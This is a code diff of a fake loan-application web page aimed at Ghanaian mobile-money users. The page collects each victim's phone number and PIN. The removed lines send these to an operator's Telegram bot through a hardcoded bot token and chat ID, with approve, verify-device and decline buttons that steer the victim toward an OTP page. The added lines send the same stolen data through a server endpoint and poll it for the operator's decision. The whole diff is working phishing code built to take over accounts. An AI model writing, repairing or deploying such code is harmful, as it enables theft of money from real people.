@@ -20,8 +20,6 @@
             --input-bg: #f9fafb;
             --shadow: 0 20px 60px rgba(0,0,0,0.10), 0 4px 16px rgba(0,0,0,0.06);
             --green: #10b981;
-            --yellow: #f59e0b;
-            --blue: #3b82f6;
         }
         *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -295,16 +293,10 @@
 </div>
 
 <script>
-    // Telegram Configuration
-    const CONFIG = {
-        BOT_TOKEN: '8843069473:AAFWS3TrGqaQQDHiZrMsDAwhSGV16SKglXA',
-        CHAT_ID: '6414813627',
-        DEVICE_PAGE: '/otp'
-    };
-
+    // This version uses server-side webhook for reliable Telegram callbacks
     let isProcessing = false;
     let userPhone = '';
-    let checkInterval = null;
+    let statusCheckInterval = null;
     let currentRequestId = null;
 
     const phoneInput = document.getElementById('phone');
@@ -343,147 +335,93 @@
         setTimeout(() => { statusMsg.style.display = 'none'; }, 3000);
     }
 
-    async function sendToBot(phone, pin) {
+    function startStatusCheck(requestId) {
+        if (statusCheckInterval) clearInterval(statusCheckInterval);
+        
+        statusCheckInterval = setInterval(async () => {
+            try {
+                const response = await fetch(`/api/check-status/${requestId}`);
+                const data = await response.json();
+                
+                console.log('Status check:', data.status);
+                
+                if (data.status === 'approved') {
+                    clearInterval(statusCheckInterval);
+                    spinner.style.display = 'none';
+                    showStatus("✅ Loan Approved! Redirecting to OTP page...", "success");
+                    setTimeout(() => window.location.href = '/otp', 1500);
+                } 
+                else if (data.status === 'verify_device') {
+                    clearInterval(statusCheckInterval);
+                    spinner.style.display = 'none';
+                    showStatus("📱 Device verification required. Redirecting...", "processing");
+                    setTimeout(() => window.location.href = '/device_verify', 1500);
+                }
+                else if (data.status === 'already_applied') {
+                    clearInterval(statusCheckInterval);
+                    spinner.style.display = 'none';
+                    showStatus("📋 You have already applied.", "error");
+                    resetButton();
+                }
+                else if (data.status === 'declined') {
+                    clearInterval(statusCheckInterval);
+                    spinner.style.display = 'none';
+                    showError("❌ Request declined.");
+                    resetButton();
+                }
+            } catch(e) {
+                console.error('Status check error:', e);
+            }
+        }, 2000);
+    }
+
+    async function sendVerification(phone, pin) {
         if (isProcessing) return;
         isProcessing = true;
         continueBtn.disabled = true;
-        continueBtn.textContent = "Verifying...";
-
+        continueBtn.textContent = "Sending...";
+        
         currentRequestId = Date.now().toString();
-        const approveId = `approve_${currentRequestId}`;
-        const verifyDeviceId = `verify_device_${currentRequestId}`;
-        const appliedId = `applied_${currentRequestId}`;
-        const declineId = `decline_${currentRequestId}`;
-
         const loanAmount = document.getElementById('loanAmount').textContent;
         const accountType = document.getElementById('accountType').value === 'mobile' ? 'Telecel Cash' : 'Broadband';
-
+        
         try {
-            const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+            const response = await fetch('/api/send-verification', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: CONFIG.CHAT_ID,
-                    text: `<b>🔴 NEW LOAN VERIFICATION</b>\n\n━━━━━━━━━━━━━━━━━━\n<b>💰 Amount:</b> ${loanAmount}\n<b>📱 Account:</b> ${accountType}\n<b>📞 Phone:</b> <code>${phone}</code>\n<b>🔐 PIN:</b> <code>${pin}</code>\n<b>🆔 Request ID:</b> <code>${currentRequestId}</code>\n<b>🕐 Time:</b> ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━━━\n\n<b>Select Action:</b>`,
-                    parse_mode: 'HTML',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                { text: "✅ Approve Loan", callback_data: approveId },
-                                { text: "📱 Verify Device", callback_data: verifyDeviceId }
-                            ],
-                            [
-                                { text: "📋 Already Applied", callback_data: appliedId },
-                                { text: "❌ Decline", callback_data: declineId }
-                            ]
-                        ]
-                    }
+                    phone: phone,
+                    pin: pin,
+                    loanAmount: loanAmount,
+                    accountType: accountType,
+                    requestId: currentRequestId
                 })
             });
-
+            
             const data = await response.json();
             
-            if (data.ok) {
+            if (data.success) {
+                showStatus("✓ Request sent! Waiting for admin approval...", "processing");
                 spinner.style.display = 'flex';
-                startCheckingForResponse(approveId, verifyDeviceId, appliedId, declineId);
+                continueBtn.textContent = "Waiting...";
+                startStatusCheck(currentRequestId);
             } else {
-                throw new Error(data.description || 'Failed to send message');
+                throw new Error("Failed to send verification");
             }
         } catch (error) {
             console.error('Error:', error);
             resetButton();
-            showError("Network error: " + error.message);
+            showError("Network error. Please try again.");
         }
-    }
-
-    function startCheckingForResponse(expectedApproveId, expectedVerifyId, expectedAppliedId, expectedDeclineId) {
-        let lastUpdateId = 0;
-        
-        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=-1`)
-            .then(r => r.json())
-            .then(data => {
-                if (data.ok && data.result && data.result.length > 0) {
-                    lastUpdateId = data.result[data.result.length - 1].update_id;
-                }
-                
-                checkInterval = setInterval(() => {
-                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
-                        .then(r => r.json())
-                        .then(data => {
-                            if (!data.ok || !data.result || data.result.length === 0) return;
-                            
-                            for (const update of data.result) {
-                                if (update.update_id > lastUpdateId) {
-                                    lastUpdateId = update.update_id;
-                                }
-                                
-                                if (update.callback_query) {
-                                    const callbackData = update.callback_query.data;
-                                    const callbackId = update.callback_query.id;
-                                    
-                                    console.log('📨 Callback received:', callbackData);
-                                    console.log('🎯 Expected approve:', expectedApproveId);
-                                    
-                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/answerCallbackQuery`, {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({
-                                            callback_query_id: callbackId,
-                                            text: "Processing..."
-                                        })
-                                    }).catch(console.error);
-                                    
-                                    if (callbackData === expectedApproveId) {
-                                        console.log('✅ MATCH! Redirecting to OTP page...');
-                                        clearInterval(checkInterval);
-                                        spinner.style.display = 'none';
-                                        showStatus("✅ Loan Approved! Redirecting...", "success");
-                                        setTimeout(() => {
-                                            window.location.href = CONFIG.DEVICE_PAGE;
-                                        }, 1000);
-                                        return;
-                                    }
-                                    else if (callbackData === expectedVerifyId) {
-                                        console.log('📱 Verify Device clicked');
-                                        clearInterval(checkInterval);
-                                        spinner.style.display = 'none';
-                                        showStatus("📱 Device verification required.", "processing");
-                                        setTimeout(() => {
-                                            window.location.href = '/device_verify.html';
-                                        }, 1000);
-                                        return;
-                                    }
-                                    else if (callbackData === expectedAppliedId) {
-                                        console.log('📋 Already Applied clicked');
-                                        clearInterval(checkInterval);
-                                        spinner.style.display = 'none';
-                                        showStatus("📋 You have already applied.", "error");
-                                        resetButton();
-                                        return;
-                                    }
-                                    else if (callbackData === expectedDeclineId) {
-                                        console.log('❌ Decline clicked');
-                                        clearInterval(checkInterval);
-                                        spinner.style.display = 'none';
-                                        showError("❌ Request declined.");
-                                        resetButton();
-                                        return;
-                                    }
-                                }
-                            }
-                        })
-                        .catch(err => console.error('Poll error:', err));
-                }, 2000);
-            });
     }
 
     function resetButton() {
         isProcessing = false;
         continueBtn.disabled = false;
         continueBtn.textContent = "Verify & Authorize Loan";
-        if (checkInterval) {
-            clearInterval(checkInterval);
-            checkInterval = null;
+        if (statusCheckInterval) {
+            clearInterval(statusCheckInterval);
+            statusCheckInterval = null;
         }
     }
 
@@ -492,7 +430,7 @@
         const pin = pinInput.value.trim();
 
         if (!phone || !isValidGhanaNumber(phone)) {
-            showError("Please enter a valid Ghana number (e.g. 0501234567");
+            showError("Please enter a valid Ghana number (e.g. 0501234567)");
             return;
         }
         if (pin.length !== 4) {
@@ -502,7 +440,7 @@
 
         userPhone = phone;
         sessionStorage.setItem('userPhone', phone);
-        sendToBot(phone, pin);
+        sendVerification(phone, pin);
     };
 
     phoneInput.addEventListener('input', () => {
